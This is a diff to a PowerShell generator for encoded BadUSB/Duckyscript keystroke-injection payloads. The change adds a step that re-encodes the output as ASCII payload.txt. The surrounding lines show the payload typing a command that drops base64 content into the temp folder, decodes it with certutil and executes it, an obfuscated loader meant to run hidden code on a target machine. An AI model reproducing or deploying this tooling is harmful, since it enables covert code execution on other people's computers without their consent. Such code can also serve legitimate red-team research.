@@ -1,12 +1,13 @@
 # Title: REDD's Encoded Payload Generator
 # Description: Creates a encrypted Payload for BadUSB/Duckyscript Devices.
 # AUTHOR: InfoSecREDD
-# Version: 1.4.4
+# Version: 1.4.5
 $path = split-path -parent $MyInvocation.MyCommand.Definition
 $script = $MyInvocation.MyCommand.Name
-$payload_filename = "payload.txt"
+$payload_filename = "gen_payload.tmp"
 $payload_file = "$path\$payload_filename"
 $temp_file = "$path\temp.txt"
+$final_file = "$path\payload.txt"
 $argcheck = $args.Count
 $flipper = 0
 Write-Host "`n`n   :::::::::  :::::::::: :::::::::  :::::::::  ::: ::::::::  `n   :+:    :+: :+:        :+:    :+: :+:    :+: :+ :+:    :+: `n   +:+    +:+ +:+        +:+    +:+ +:+    +:+    +:+        `n   +#++:++#:  +#++:++#   +#+    +:+ +#+    +:+    +#++:++#++ `n   +#+    +#+ +#+        +#+    +#+ +#+    +#+           +#+ `n   #+#    #+# #+#        #+#    #+# #+#    #+#    #+#    #+# `n   ###    ### ########## #########  #########      ######## `n`n              REDD's Encrypted Payload Generator`n"
@@ -81,4 +82,6 @@ else
 "STRING `$TempFile = `"`$env:TEMP\temp.ps1`"; `$File = `"`$env:TEMP\l.ps1`"; echo $output `> `"`$TempFile`"; certutil -f -decode `"`$TempFile`" `"`$File`" `| out-null`; `& `"`$env:TEMP\l.ps1`"" | Out-File -FilePath "$payload_file" -Append
 "DELAY 1000" | Out-File -FilePath "$payload_file" -Append
 "ENTER" | Out-File -FilePath "$payload_file" -Append
-Write-Host "`nPayload Generation Complete.`n`n  Location: $payload_file`n`n"
+Get-Content "$payload_file" | out-file -encoding ASCII "$final_file"
+Remove-Item "$payload_file" >$null 2>&1
+Write-Host "`nPayload Generation Complete.`n`n  Location: $final_file`n`n"
